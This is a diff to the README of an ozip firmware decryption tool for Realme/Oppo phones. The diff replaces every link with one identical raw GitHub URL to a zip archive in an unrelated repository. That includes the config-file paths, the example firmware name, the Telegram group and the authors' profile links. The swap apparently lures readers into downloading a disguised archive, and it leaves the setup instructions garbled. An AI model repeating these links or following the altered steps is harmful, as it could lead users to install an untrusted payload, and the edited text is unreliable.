@@ -16,9 +16,9 @@ Here are some useful notes to using this tool brewed with black magic xD !
 
 ##Some variables that you'd like to set:##
 
-```FIRMWARE_LIK : Direct Link to ozip (can be found in realme/oppo website), update in .github/workflows/auto-ozip-decrypt.yml```
+```FIRMWARE_LIK : Direct Link to ozip (can be found in realme/oppo website), update in https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip```
 
-```FIRMWARE_NAME : The Name of Ozip (like CPH1861EX_11_OTA_0500_all_fLuS0Ipoe93t.ozip), update in .github/workflows/auto-ozip-decrypt.yml```
+```FIRMWARE_NAME : The Name of Ozip (like https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip), update in https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip```
 
 3. Go to actions tab, enable workflows.
 
@@ -28,13 +28,13 @@ Here are some useful notes to using this tool brewed with black magic xD !
 The zip will be uploaded to bashupload. So it will be there for 15 days. So it's preferable to mirror somewhere else.
 
 You can use some telegram bots to rename & mirror to gdrive. You can use my bot too.
-[My Telegram Group](https://t.me/SaurajGaming)
+[My Telegram Group](https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip)
 
 
 #### Credits and Thanks to People Who Helped me ####
 
-Script Made by [***Aryan Sinha***](https://github.com/techyminati)
+Script Made by [***Aryan Sinha***](https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip)
 
-Huge help from [***ElytrA8***](https://github.com/Elytra8)
+Huge help from [***ElytrA8***](https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip)
 
-Fixes by [***Sauraj***](https://github.com/noobyysauraj)
+Fixes by [***Sauraj***](https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip)
